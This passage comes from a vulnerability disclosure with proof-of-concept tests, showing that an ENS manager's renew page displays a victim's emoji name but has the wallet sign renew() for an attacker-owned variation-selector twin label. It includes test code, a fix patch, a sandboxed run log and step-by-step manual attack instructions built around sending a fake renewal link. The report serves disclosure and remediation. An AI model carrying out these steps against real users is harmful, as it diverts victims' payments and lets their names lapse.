| 2. `renew_page_shows_one_name_signs_another.poc.test.tsx` | the real loaders, then the page: the real renewal provider and state machine, the heading, the price query, the real `submitRenewActor`, and the details panel | the `<h1>` text; the label the price is quoted for; the `renew(label, ...)` calldata handed to the transaction manager and the address it targets; the name and "Expires" line on the rendered panel, while the transaction is pending and after it succeeds | 4 tests; observed 3 passed, 1 failed on the frozen snapshot, the failure being the counterfactual; with the patch, 2 passed, 2 failed |

File 1 measures what the loaders hand the page. File 2 measures what the page does with it: what it shows, what it prices, what it asks the wallet to sign, and what it reports afterwards. The two join at a measured value: the `label` and `currentExpiry` file 2 mounts the page with are the loader's own return value, obtained by calling the same loader.

The runnable copies, the patch, the full capture of the executed runs (`CAPTURE.log`) and a `README.md` with placement and commands are in a single secret Gist: <https://gist.github.com/ChaseTheLight01/54c0ede77a6f5f09aa2e9faaafd76e90>. Nothing below depends on opening it. Every function and component under test is production code.

### Where this runs, and what it never touches

No chain, no signing, no wallet connection and no live network state; the runs were made in a namespace with no route out, and no line of any run mentions an outbound request. File 1 replaces eight modules, none of which canonicalises a name:

* `@tanstack/react-router`, so that `createFileRoute` returns the route's options object and the loader can be called directly, with `params.name` as the router passes it after percent-decoding (`@tanstack/router-core` 1.168.15, `dist/esm/new-process-route-tree.js:466-483`); neither renew route defines `params.parse` or `beforeLoad`, and `__root.tsx` has none. This is the same replacement the project's own route test uses (`apps/manager/src/routes/$name/index.test.tsx:6-18`).
* `@ensdomains/ensjs/public/v2` and `@ensdomains/ensjs/public/v1`: the owner, expiry and renewability reads, each replaced by a lookup in an in-memory registration table keyed on the exact string the app passes, which also records that string.
* `@ens-apps/indexer/urql`: the record index client, replaced by a client that answers "no domain" and records the call. On the path this report files on, a v2 name with a nonzero owner, it is never called (`profileOwner.ts:60-65` returns first).
* `@/lib/wagmi` and `@/lib/wagmi/helpers`: the app's wagmi config and client. The config builds a WalletConnect connector at import time, so it is replaced the way the project's own tests replace it (`apps/manager/src/features/bulk-renew/hooks/useBulkRenewSubmit.test.ts:27`); `profileExpiry.ts` takes only the chain definition from it.
* The page and its error component, which are off the loader's path.

File 2 keeps those replacements (the router one narrowed to `createFileRoute` alone, because `apps/manager/src/components/ui/button.tsx:2,86` calls the router's `createLink` at import time and the details panel imports that module) and adds five more, each the way the project's own tests do it:

* The two chain-touching side actors of the renewal machine, the allowance read and the transaction poll, replaced as in `apps/manager/src/features/renew/state/renewalUi.machine.test.ts:15-23,61-64`. That test also replaces `submitRenewActor`; this file keeps it real, because it is the function that encodes the label.
* Inside `submitRenewActor`, the payment-token whitelist read and `transactionManager.startTransaction`, replaced as in `packages/transaction-manager/src/machines/registration/registration.renew.actors.test.ts:15-28`. The second is the wallet boundary: the test records the arguments it receives.
* The router's root context, which the machine uses to invalidate queries after success, replaced as in `renewalUi.machine.test.ts:25-27`.
* ensjs `getRenewPrice` and `getBaseRates`, answered from the same registration table.
* The success panel's "Back to profile" button, a router link that needs a mounted router, replaced by a plain anchor.

Everything else runs real: both route loaders, `parseRenewableName` and `parseName`, `canRenewV2Name` and `isRenewableV2EthName`, `getExpiry`, `getOwner` and `normalizeEth2LdName`, `getIsV1Renewable`, the app's `getRenewPrice` query function, `RenewalUiProvider` and the renewal state machine through every state from pricing to success, `submitRenewActor` and its encoder, `PricingDomainHeader`, `RenewalDetails` and the components under it, the project's own test render wrapper (`apps/manager/src/utils/test-utils.tsx`), and viem's `normalize`, `labelhash` and `decodeFunctionData`. The registration table holds two entries: the canonical name, owned by the victim and expiring in about 30 days, and the twin, owned by the attacker and expiring in about 300 days, so the two expiries cannot be confused; each carries a fixture price, 640 USDC for the three-character canonical label and 5 USDC for the six-character twin, so the two quotes cannot be confused either.

The ensjs reads are replaced at the ensjs module boundary, one call below the app's own service functions, because the real functions issue `eth_call`s. What they receive is exactly the string the app decided to read about, and that string is what the tests assert on.

### File 1: the two canonicalisers

The first test runs each side's own function on the twin segment and prints and asserts the result. Verbatim from the file:

```ts
  it('parseName keeps U+FE0F, ENSIP-15 strips it, and the two labels are two registrations', () => {
    const parsed = parseRenewableName(world.TWIN)._unsafeUnwrap()
    const canonical = normalizeEth2LdName(world.TWIN)

    report('canonicalisers', [
      `URL segment                 : ${JSON.stringify(world.TWIN)}`,
      `parseName label (renewed)   : ${JSON.stringify(parsed.label)}`,
      `normalize name (shown/gated): ${JSON.stringify(canonical?.name)}`,
      `labelhash(parseName label)  : ${labelhash(parsed.label)}`,
      `labelhash(canonical label)  : ${labelhash(world.CANONICAL_LABEL)}`,
    ])

    expect(normalize(world.TWIN)).toBe(world.CANONICAL)
    expect(parsed.label).toBe(world.TWIN_LABEL)
    expect(canonical?.label).toBe(world.CANONICAL_LABEL)
    expect(parsed.label).not.toBe(canonical?.label)
    expect(labelhash(parsed.label)).not.toBe(labelhash(world.CANONICAL_LABEL))
    expect(namehash(world.TWIN)).not.toBe(namehash(world.CANONICAL))
    // The route's own eligibility regex accepts the raw form.
    expect(isRenewableV2EthName(`${parsed.label}.eth`, new Date(Date.now() + 86_400_000))).toBe(true)
  })
```

`parseRenewableName` is what both loaders call at their first line; `normalizeEth2LdName` is what `getExpiry` calls at its first line. The `labelhash` and `namehash` assertions are the reason the two labels are two registrations, and the last assertion is the route's own eligibility regex accepting the raw form.

### File 1: the `/renew/$name` loader

The second test calls the real loader with the twin segment and reads what it returns. Verbatim:

```ts
  it('reads the expiry on the canonical name and returns the raw label to the page', async () => {
    const data = await runLoader(RenewRoute, world.TWIN)

    report('/renew/$name loader', [
      `URL segment            : ${JSON.stringify(world.TWIN)}`,
      `v2 expiry asked for    : ${JSON.stringify(world.asked.expiryV2)}`,
      `v2 owner asked for     : ${JSON.stringify(world.asked.ownerV2)}`,
      `label returned         : ${JSON.stringify(data.label)}`,
      `currentExpiry returned : ${data.currentExpiry} (victim ${world.VICTIM_EXPIRY}, attacker ${world.ATTACKER_EXPIRY})`,
    ])

    // Expiry (what the page shows and gates on): the victim's name.
    expect(world.asked.expiryV2).toEqual([world.CANONICAL])
    expect(data.currentExpiry).toBe(world.VICTIM_EXPIRY)
    // Label (what the page renews): the attacker's registration.
    expect(data.label).toBe(world.TWIN_LABEL)
    expect(world.registrations.get(`${data.label}.eth`)?.owner).toBe(world.ATTACKER)
    // And the calldata built from it is not the canonical name's calldata.
    expect(renewCalldata(data.label)).not.toBe(renewCalldata(world.CANONICAL_LABEL))
  })
```

The `renewCalldata` helper encodes `renew` with the same ABI snippet and the same `label.replace('.eth', '')` that `encodeRenewData` uses (`registration.actors.ts:1025-1030`); file 2 replaces this comparison with the real encoder's output:

```ts
const renewCalldata = (label: string) =>
  encodeFunctionData({
    abi: ethRegistrarRenewSnippet,
    functionName: 'renew',
    args: [
      label.replace('.eth', ''),
      BigInt(365 * 86_400),
      '0x0000000000000000000000000000000000000001',
      `0x${'00'.repeat(32)}`,
    ],
  })
```

A control test in the same `describe` calls the loader with the canonical segment and asserts the expiry read, the returned label and the registration's owner all agree on one name.

### File 1: the `/renew-v1/$name` loader

The third test switches the registration table to v1, calls the real v1 loader and reads what it returns. Verbatim:

```ts
  it('gates on the attacker label being renewable while showing the victim expiry', async () => {
    world.mode.canonicalProtocol = 'v1'
    const data = await runLoader(RenewV1Route, world.TWIN)

    report('/renew-v1/$name loader', [
      `URL segment            : ${JSON.stringify(world.TWIN)}`,
      `owner asked for (v2,v1): ${JSON.stringify(world.asked.ownerV2)} ${JSON.stringify(world.asked.ownerV1)}`,
      `v1 expiry asked for    : ${JSON.stringify(world.asked.expiryV1)}`,
      `isRenewable asked for  : ${JSON.stringify(world.asked.isRenewable)}`,
      `label returned         : ${JSON.stringify(data.label)}`,
      `currentExpiry returned : ${data.currentExpiry} (victim ${world.VICTIM_EXPIRY})`,
    ])

    expect(world.asked.ownerV1).toEqual([world.CANONICAL])
    expect(world.asked.expiryV1).toEqual([world.CANONICAL])
    expect(world.asked.isRenewable).toEqual([world.TWIN_LABEL])
    expect(data.currentExpiry).toBe(world.VICTIM_EXPIRY)
    expect(data.label).toBe(world.TWIN_LABEL)
    expect(world.registrations.get(`${data.label}.eth`)?.owner).toBe(world.ATTACKER)
  })
```

The owner and expiry reads are asked for the canonical name; the renewability read is asked for the twin label. Its control calls the loader with the canonical segment and asserts `isRenewable` was asked for the canonical label.

### File 2: from the loader to the wallet

File 2 mounts the real `RenewalUiProvider` with the loader's output, exactly as `RenewalPage.tsx:22-26` does, with the heading and the panel as its children, and reads the provider's context the way the Renew button does (`ConfirmPurchase.tsx:14`); the consumer chain from that context to the heading, the price query, the calldata and the panel is cited in the Vulnerability Details section. The three replacements that bound the consumer path, verbatim from the file:

```ts
vi.mock(
  '@ens-apps/transaction-manager/machines/registration/registration.actors',
  async (importOriginal) => {
    const { okAsync, ResultAsync } = await import('neverthrow')
    return {
      ...(await importOriginal<
        typeof import('@ens-apps/transaction-manager/machines/registration/registration.actors')
      >()),
      readPaymentTokenAllowanceActor: () => okAsync(world.ALLOWANCE),
      pollTransactionStatusActor: () =>
        ResultAsync.fromSafePromise(world.gate.current.promise),
    }
  },
)

// Inside `submitRenewActor`, the two things that would leave the process are
// replaced the way the project's own actor test replaces them
// (registration.renew.actors.test.ts:15-28): the payment-token whitelist read
// and the transaction manager. The encoder between them runs real.
vi.mock('@ens-apps/transaction-manager/contracts/paymentToken', async (importOriginal) => ({
  ...(await importOriginal<
    typeof import('@ens-apps/transaction-manager/contracts/paymentToken')
  >()),
  assertPaymentTokenSupported: async () => undefined,
}))
vi.mock('@ens-apps/transaction-manager/providers/transactionManager', async (importOriginal) => ({
  ...(await importOriginal<
    typeof import('@ens-apps/transaction-manager/providers/transactionManager')
  >()),
  transactionManager: {
    startTransaction: (...args: unknown[]) => {
      world.wallet.push(args)
      return 'tx-1'
    },
  },
}))
```

The driver then quotes the price for the context label with the app's own query function, sends the same pricing-step events the machine requires before Renew is enabled and the same `renewal.start` event the button sends, waits for the real actor to reach the transaction manager, reads the panel, releases the poll, and reads the panel again at success. Verbatim:

```ts
  // The price the confirm step quotes for the context label
  // (ConfirmPurchase.tsx:21-22 -> renewPricing.query.ts:36-42): the app's own
  // query function, run on the same label.
  const duration = uiActor.getSnapshot().context.duration
  const quote = await getRenewPrice(label, duration, 'USDC', protocol)
  if (quote.isErr()) throw quote.error
  const priceRaw = quote.value.amount

  // The pricing steps the machine requires before Renew is enabled
  // (renewalUi.machine.ts:204-243), then the Renew button's event
  // (ConfirmPurchase.tsx:63-72), with the label the button reads from context.
  act(() => {
    uiActor.send({ type: 'pricing.step.next' })
    uiActor.send({ type: 'pricing.token.select', token: 'USDC' })
    uiActor.send({ type: 'pricing.step.next' })
    uiActor.send({
      type: 'renewal.start',
      label,
      signer,
      ownerAddress: EOA,
      duration,
      token: 'USDC',
      priceRaw,
      priceNumber: Number(priceRaw) / 10 ** TOKENS.USDC.decimals,
    })
  })

  // Allowance read (stubbed as sufficient) -> submittingPlainRenewal ->
  // the real submitRenewActor -> transactionManager.startTransaction.
  await waitFor(uiActor, (s) => s.matches('waitingForRenewal'), {
    timeout: 5_000,
  })
  await screen.findByText('Renewal Details')
  const pending = readPanel()

  // Release the transaction poll: the machine reports success and the
  // success step renders the same panel (SuccessStep.tsx:9).
  await act(async () => {
    world.gate.current.release()
    await waitFor(uiActor, (s) => s.matches('success'), { timeout: 5_000 })
  })
```

### File 2: what is asserted

For the twin segment on `/renew/$name`, after decoding the calldata the transaction manager received with the registrar's own `renew` ABI. Verbatim:

```ts
    // The loader read the victim's registration.
    expect(world.asked.expiryV2).toEqual([world.CANONICAL])
    expect(r.data.currentExpiry).toBe(world.VICTIM_EXPIRY)

    // The heading is the attacker's label, and under the name system's own
    // equivalence it reads as the victim's name.
    expect(r.headingText).toBe(`${world.TWIN_LABEL}.eth`)
    expect(r.headingText).not.toBe(world.CANONICAL)
    expect(normalize(r.headingText)).toBe(world.CANONICAL)

    // The price the confirm step quotes for the context label is the
    // attacker label's price.
    expect(world.asked.price).toEqual([world.TWIN_LABEL])
    expect(r.priceRaw).toBe(world.ATTACKER_PRICE)

    // The wallet is asked to sign renew(attackerLabel, ...) on the v2
    // registrar, as encoded by the shipped actor.
    expect(world.wallet).toHaveLength(1)
    expect(w.request.type).toBe('eoa')
    expect(w.request.from).toBe(EOA)
    expect(w.request.to).toBe(ENS_SEPOLIA_CONTRACTS.ETHRegistrar)
    expect(w.decoded.functionName).toBe('renew')
    expect(w.args[0]).toBe(world.TWIN_LABEL)
    expect(w.args[0]).not.toBe(world.CANONICAL_LABEL)
    expect(w.args[1]).toBe(r.duration)
    expect(w.args[2].toLowerCase()).toBe(TOKENS.USDC.address.toLowerCase())
    expect(w.args[3]).toBe(REFERER_ADDRESS)
    expect(w.description).toBe(`Renew ${world.TWIN_LABEL}.eth`)

    // The label's hash differs from the hash of the victim's registration,
    // and the registration table maps it to the attacker's entry.
    expect(labelhash(w.args[0])).not.toBe(labelhash(world.CANONICAL_LABEL))
    expect(world.registrations.get(`${w.args[0]}.eth`)?.owner).toBe(
      world.ATTACKER,
    )
    for (const [name, registration] of world.registrations) {
      if (registration.owner === world.VICTIM) {
        expect(labelhash(name.slice(0, -4))).not.toBe(labelhash(w.args[0]))
      }
    }

    // The panel, while the transaction is pending and after it succeeds:
    // one card carrying the attacker label, one Expires line computed from
    // the victim's expiry.
    for (const panel of [r.pending, r.done]) {
      expect(panel.card).toBe(`${world.TWIN_LABEL}.eth`)
      expect(normalize(panel.card)).toBe(world.CANONICAL)
      expect(panel.expiresValue).toBe(fromVictim)
      expect(panel.expiresValue).not.toBe(fromAttacker)
    }
```

The heading assertion pair is the identity claim: the text is the attacker's label, and `normalize` maps it to the victim's name, which is the equivalence under which a person and the name system read it. The calldata assertions are the transaction claim: the label inside `renew(...)` is the attacker's, its hash is not the hash of any registration the victim owns, and the call targets the v2 registrar. The panel assertions are the receipt claim: the card carries the attacker's label and the "Expires" date is computed from the victim's expiry, both while the transaction is pending and after the machine reports success (`SuccessStep.tsx:9` renders the same panel). A control test runs the same driver on the canonical segment and asserts heading, price, calldata, target, owner, card and "Expires" all agree on one name.

### File 2: the v1 renewer

The same driver on `/renew-v1/$name` with the registration table switched to v1. The machine targets `ETHRenewerV1` for that protocol (`renewalUi.machine.ts:189`, `renewalProtocol.ts:5-8`); the provider, machine, actor and panel are otherwise the same code as the v2 page test, so its controls are the v2 page control above and the file 1 v1 loader control. Verbatim:

```ts
    expect(world.asked.expiryV1).toEqual([world.CANONICAL])
    expect(world.asked.isRenewable).toEqual([world.TWIN_LABEL])
    expect(r.data.currentExpiry).toBe(world.VICTIM_EXPIRY)
    expect(r.headingText).toBe(`${world.TWIN_LABEL}.eth`)
    expect(w.request.to).toBe(ENS_SEPOLIA_CONTRACTS.ETHRenewerV1)
    expect(w.args[0]).toBe(world.TWIN_LABEL)
    expect(world.registrations.get(`${w.args[0]}.eth`)?.owner).toBe(
      world.ATTACKER,
    )
    expect(r.done.card).toBe(`${world.TWIN_LABEL}.eth`)
    expect(r.done.expiresValue).toBe(
      expiresLineFor(r.duration, world.VICTIM_EXPIRY),
    )
```

### Attack steps, by hand

Given a v2 name `🔥🔥🔥.eth` owned by the victim, and an attacker:

1. **Register the twin.** Through the Manager, open `/register/🔥️🔥️🔥️.eth` (a U+FE0F after each U+1F525) and complete registration; the registration path carries the label unchanged (Trigger and preconditions). A direct call to the registrar with the same label is equivalent.
2. **Send the link.** `https://<manager host>/renew/🔥️🔥️🔥️.eth`, framed as a renewal reminder. The URL, the tab title and the page heading read `🔥🔥🔥.eth` to a person; U+FE0F has no glyph and U+1F525 already has emoji presentation.
3. **The victim opens it.** The loader reads the owner and expiry of `🔥🔥🔥.eth`, finds it registered and within its renewal window, and hands the page the label `🔥️🔥️🔥️` next to `🔥🔥🔥.eth`'s expiry. The price shown is `getRenewPrice("🔥️🔥️🔥️", ...)`.
4. **The victim picks a duration and confirms.** The wallet asks for an ERC-20 approval to the registrar and for `renew("🔥️🔥️🔥️", duration, token, referrer)`. Decoding the calldata shows the six-code-point label.
5. **Read the registrar.** The twin's expiry advanced by the duration; the victim's did not. The page's "Expires" line shows the victim's old expiry plus the duration.

### The counterfactual: the fix patch

Save it as `canonicalise_renewable_label.patch` and apply with `patch -p1` at the repository root. Its last line, `# End of patch`, is a sentinel: where a delivery path strips a file's final newline, the loss lands on that line rather than on the patch's last context line, whose truncation `git apply` rejects as a corrupt patch. Keep it.

```diff
Derive the renewable label from the ENSIP-15 form of the route name.

`parseRenewableName` is the one place both renew loaders take the label
that becomes the page heading, the price quote and the `renew(label, ...)`
calldata (routes/renew/$name.tsx:20,61; routes/renew-v1/$name.tsx:15,51).
It returns `parseName`'s label, which is only trimmed and lowercased
(name-parser.ts:46), while every owner, protocol and expiry read on the
same page goes through `normalizeEth2LdName`, viem's ENSIP-15 `normalize`
(profileExpiry.ts:77). This change makes the label the canonical one, so
the registration the page renews is the registration whose expiry it read,
and rejects a route name that ENSIP-15 cannot normalise.

With this applied, the counterfactual test at the end of each PoC file is
expected to pass, and the first assertion on the label in each defect test
to fail: three tests in `renew_route_two_canonical_forms.poc.test.ts`, two
in `renew_page_shows_one_name_signs_another.poc.test.tsx` (see the report
for the exact set). The three control tests are expected to pass either way.

Applies to apps/manager/src/features/renew/utils/renewableName.ts at the
audited snapshot. If line offsets have drifted, apply with
`patch -p1 --fuzz=3` or by hand: it is three edits in one file.

--- a/apps/manager/src/features/renew/utils/renewableName.ts
+++ b/apps/manager/src/features/renew/utils/renewableName.ts
@@ -1,9 +1,13 @@
 import { TaggedError } from '@ens-apps/utils/neverthrow'
 import { err, ok } from 'neverthrow'
 import { isRenewableV2EthName } from '@/features/grace/utils/gracePeriod'
+import { normalizeEth2LdName } from '@/features/profile/service/profileName'
 import { parseName } from '@/features/register-v2/utils/name-parser'
 
-type RenewableNameErrorReason = 'TLD_NOT_SUPPORTED' | 'SUBNAMES_NOT_SUPPORTED'
+type RenewableNameErrorReason =
+  | 'TLD_NOT_SUPPORTED'
+  | 'SUBNAMES_NOT_SUPPORTED'
+  | 'NOT_NORMALIZED'
 
 export class RenewableNameError<
   TReason extends RenewableNameErrorReason,
@@ -14,6 +18,7 @@
     return {
       TLD_NOT_SUPPORTED: 'Only .eth names are supported',
       SUBNAMES_NOT_SUPPORTED: 'Subnames are not supported',
+      NOT_NORMALIZED: 'This name is not a valid ENS name',
     }[this.reason]
   }
 
@@ -32,7 +37,17 @@
       return RenewableNameError.err('SUBNAMES_NOT_SUPPORTED')
     }
 
-    return ok(parsedName)
+    // One canonical form. The loaders read owner, protocol and expiry on the
+    // ENSIP-15 form of the route name (profileExpiry.ts:77); the label that
+    // reaches the heading, the price quote and the `renew` calldata must be
+    // that same form, not the merely lowercased one.
+    const canonical = normalizeEth2LdName(`${parsedName.label}.eth`)
+
+    if (!canonical) {
+      return RenewableNameError.err('NOT_NORMALIZED')
+    }
+
+    return ok({ ...parsedName, label: canonical.label })
   })
 
 export const isRenewableName = (name: string) => parseRenewableName(name).isOk()
# End of patch
```

The patch header names the assertions that flip. Observed under the patch (the second run in the capture): the counterfactual test at the end of each file passes, each defect test fails at its first assertion on the label (file 1 `:217`, `:243`, `:274`; file 2 `:513`, `:595`), and the three control tests pass either way; file 1, 3 failed, 3 passed; file 2, 2 failed, 2 passed. The patch applied in the overlay without rejects or offsets.

### What is measured, and what is argued

| Claim                                                                                                                                                                                                                                                                                                                        | How it is established                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| The transaction the page asks the wallet to sign is `renew(twinLabel, duration, USDC, referrer)` on the registrar, encoded by the shipped `submitRenewActor` from the label the page holds; that label's hash differs from the hash of the victim's registration, and the registration table maps it to the attacker's entry | Executed green, file 2, `/renew/$name` page test (run 1 in the capture). The calldata is decoded at `transactionManager.startTransaction`, the wallet boundary; the printed `renew() label in calldata` is the six-code-point twin label                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| The page shows the victim's name: the `<h1>` is the twin label and normalises to the victim's name; the details panel's card is the twin label and its "Expires" date is computed from the victim's expiry, pending and at success                                                                                           | Executed green, file 2, same test (run 1). Read from the rendered DOM; the printed `panel Expires` is October 14, 2027 pending and at success, the victim's expiry plus the duration, against July 10, 2028 from the attacker's                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| The price the confirm step quotes is quoted for the twin label                                                                                                                                                                                                                                                               | Executed green, file 2, same test (run 1). The app's own `getRenewPrice` is run on the context label and the label it asks the renewer about is recorded: the twin label, quoted at the twin's fixture price                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| The `/renew/$name` loader asks the expiry read for the canonical name and hands the page the twin label next to that expiry                                                                                                                                                                                                  | Executed green, file 1, `/renew/$name` test (run 1). File 2 mounts the page with that return value                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| The two canonicalisers diverge on the twin, and the two labels hash to two different registrations                                                                                                                                                                                                                           | Executed green, file 1, first test (run 1): `labelhash('🔥️🔥️🔥️') = 0x0723b895...`, `labelhash('🔥🔥🔥') = 0x4fcdcd9b...`, the same two values measured beforehand with viem 2.52.2 outside the test files                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| The `/renew-v1/$name` loader gates on the twin label's renewability and reads the canonical name's owner and expiry, and the page then signs `renew(twinLabel, ...)` on `ETHRenewerV1`                                                                                                                                       | Executed green, file 1, `/renew-v1/$name` test, and file 2, v1 test (run 1); the v1 transaction targets `ETHRenewerV1`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| The canonical segment reads, shows, prices, signs and reports one name (control)                                                                                                                                                                                                                                             | Executed green, file 1, two control tests; file 2, one control test (run 1), and again with the patch (run 2)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| Deriving the label from the ENSIP-15 form makes the label the page shows and signs the label whose expiry it read                                                                                                                                                                                                            | Executed: both counterfactual tests fail unpatched (run 1) and pass patched (run 2); the five defect tests fail patched at their first label assertion                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| The frames between the loader and the components under test pass the label and the expiry through unchanged                                                                                                                                                                                                                  | Argued from source: `routes/renew/$name.tsx:69-74`, `RenewalPage.tsx:13-29,35-50`, `PricingStep.tsx:12-41`, `ConfirmPurchase.tsx:13-79`, `RenewingStep.tsx:62`, `SuccessStep.tsx:9`. The pricing step's other children and the renewing step's navigation guard need a mounted wallet and router and carry no name                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| Either renewer the app targets renews the registration the label names and prices the label it is given                                                                                                                                                                                                                      | Argued from source: neither renewer is in the audited repository; in the project's contracts repository, pinned to one commit, both inherit `renew` from `AbstractETHRegistrar` (`ETHRegistrar.sol:37`, `ETHRenewerV1.sol:35`) and neither overrides `renew` or `_requireRenewable`. That `renew` resolves the registration as `ETH_REGISTRY.getState(LibLabel.id(label))` and renews `state.tokenId`, with `LibLabel.id` = `uint256(keccak256(bytes(label)))` (`AbstractETHRegistrar.sol:87,91,136`, `LibLabel.sol:7-9`); `ETHRenewerV1` additionally syncs ENSv1 as `BASE_REGISTRAR.renew(LibLabel.id(label), duration)` (`ETHRenewerV1.sol:133-135`), keyed the same way. The app's own registry expiry read is keyed on `labelhash(labels[0])` as given (ensjs `src/actions/public/v2/getExpiry.ts:54`). Cited in Vulnerability Details. Not executed against a chain                    |
| Each renewer accepts a different registration state, so the twin that reaches each route is different                                                                                                                                                                                                                        | Argued from source: `ETHRegistrar._isRenewable` takes `REGISTERED`, or in grace having been registered (`ETHRegistrar.sol:264-272`), which is what the Manager's own register route produces; `ETHRenewerV1._isRenewable` takes `RESERVED`, or `AVAILABLE` with a null owner inside the v2 grace period (`ETHRenewerV1.sol:138-148`), and `RESERVED` is a registration with a null owner, entered only with a root role (`PermissionedRegistry.sol:49-51,212-213,218-224,407-409,430,598-608`). So the v1 route's twin is a label the registry holds as `RESERVED`, or one that is `AVAILABLE` with a null latest owner inside the v2 grace period, not an ordinary registration made through the app, and this report files on the v2 route. Not executed: these tests answer renewability from a lookup table, so they measure the split on both routes and not the precondition on either |
| The attacker can hold the twin as an ordinary v2 registration, which is the route this report files on                                                                                                                                                                                                                       | Argued from source: the Manager's registration path carries the label unchanged (Trigger and preconditions), the project's own statement of the contract-side rule (`isNameOrAddress.ts:9-10`), and the rent price oracle's validity predicate, read from the verified source published at the oracle address the app pins: `isValid` is `getBasePrice(label, 1) > 0` and carries the docstring "Does not check if normalized."; `getBasePrice` rejects on byte length alone (cited in Vulnerability Details). Not read here: the oracle's stored rate table, and which oracle instance the registrar the app targets holds, the owner being able to replace it                                                                                                                                                                                                                              |

### What this PoC does not establish

1. **The transaction on a chain.** The calldata is decoded at the wallet boundary; it is not sent to a registrar, so the twin's expiry advancing is argued from the registrar interface rather than read back.
2. **That any twin is registered today.** The PoC creates the condition in its registration table; it does not survey deployed names.
3. **The deployed renewers.** Both renewers' `renew` keying, and the registration state each will renew, are read from the project's contracts repository pinned to one commit (cited in Vulnerability Details), not from the audited repository. As of 2026-09-14 Blockscout's Sepolia instance publishes, for the two addresses the app's own pinned chain constants name (reference 15 in Vulnerability Details), fully verified source for both, neither a proxy and neither verified through a bytecode twin, compiled with `0.8.27+commit.40a35a09` and verified on 9 and 10 August 2026. The four files this report cites that those two deployments publish are byte-identical to the repository at that commit, with one exception that changes no code: in `ETHRenewerV1.sol` three comment lines sit in a different order and a duplicated documentation line appears once instead of twice, and stripping comments leaves the two files identical line for line. Neither deployment publishes `PermissionedRegistry.sol`, but both name the same registry address in their decoded constructor arguments, and the verified source published at that address is byte-identical to the repository copy this report cites (reference 15). That is an explorer's verification record read at a point in time, not an execution: no bytecode was rebuilt and compared and no contract was called, so what the deployed code does at the current block is still not established here. The v2 registrar's label-validity rule is not in the audited repository either. It is read instead from the verified source published at the oracle address the app pins (cited in Vulnerability Details), which both deployments name in their own decoded constructor arguments. Two things about it are still open here: the oracle's rate table values are supplied to its constructor and were not read from the deployment, and which oracle either registrar holds today was not read, a registrar's owner being able to point it at a different one after construction. The finding holds for whatever set of forms the registrar admits, since the Manager itself registers any label the registrar accepts.
4. **The full pricing page with its wallet-bound siblings mounted.** File 2 renders the heading and the details panel under the real provider with the loader's output; the duration selector, payment card and token dialog need a connected wallet and a mounted router and do not carry the name.
5. **The approval leg.** The allowance read is stubbed as sufficient, so `submitApprovalActor` is not reached; the spender it would encode is the renewer address the machine hands it (`renewalUi.machine.ts:259`; `registration.actors.ts:850-853`).

### The captured runs

The two runs (unpatched, then the patch, then patched) were executed in one sealed session on 2026-09-14: new user, network, pid, ipc, uts and cgroup namespaces with only `lo` present, the host filesystem read-only, a throwaway overlay over the snapshot so nothing was written to it, and four fail-closed isolation gates before any test (no inherited descriptor, interfaces exactly `lo`, no socket file visible, TCP v4, TCP v6 and DNS probes all blocked), then a toolchain version check. The block below is the whole capture, byte-identical to the `CAPTURE.log` in the Gist, with one substitution disclosed here: the two vitest banners print the absolute path of the snapshot on the host, replaced with `<archive-root>` in both the Gist copy and this block. The lines under `stdout |` are the `report(...)` measurements; the `×` lines and the `AssertionError` blocks are the counterfactuals failing unpatched and the defect tests failing patched.

```
=== NAMESPACE IDENTITY ===
uid inside: 1000   kernel: Linux 6.19.13+parrot7-amd64   netns: net:[4026532694]
env keys: CI DEST_DIR HOME NO_COLOR PATH PWD SHLVL TZ _ 
=== FAILSAFE 0: no inherited fds except stdio pipes and /dev/null (sends nothing) ===
fds clean: 0 1 2 3 
=== FAILSAFE 1: interfaces must be exactly lo (sends nothing) ===
interfaces: lo 
=== FAILSAFE 2: no UNIX socket file visible anywhere (sends nothing) ===
no socket files visible
=== FAILSAFE 3: egress probes (each must be blocked) ===
tcp4 1.1.1.1:443 -> blocked: ENETUNREACH
tcp6 [2606:4700:4700::1111]:443 -> blocked: ENETUNREACH
dns example.com -> blocked: EAI_AGAIN
=== FAILSAFE 4: toolchain ===
node: v22.18.0   vitest: vitest/4.1.5 linux-x64 node-v22.18.0
=== PLACEMENT (overlay only) ===
=== ARM 1: UNPATCHED (expected: file 1 -> 5 passed 1 failed, file 2 -> 3 passed 1 failed; the failures are the two counterfactuals) ===

 RUN  v4.1.5 <archive-root>/apps/manager

stdout | src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > one URL segment, two canonical forms > parseName keeps U+FE0F, ENSIP-15 strips it, and the two labels are two registrations
canonicalisers
  URL segment                 : "🔥️🔥️🔥️.eth"
  parseName label (renewed)   : "🔥️🔥️🔥️"
  normalize name (shown/gated): "🔥🔥🔥.eth"
  labelhash(parseName label)  : 0x0723b89521a1eb8c9e72fcd1194f6cf222364aca319c226ae79fafe10a9e5f2c
  labelhash(canonical label)  : 0x4fcdcd9b2aeda84409e4e1a1b25af4129e9ba9a5beb49cab0a7b68bf1dc2a734

 ✓ src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > one URL segment, two canonical forms > parseName keeps U+FE0F, ENSIP-15 strips it, and the two labels are two registrations 177ms
stdout | src/routes/renew/renew_route_two_canonical_forms.poc.test.ts > /renew/$name (v2) > reads the expiry on the canonical name and returns the raw label to the page
/renew/$name loader
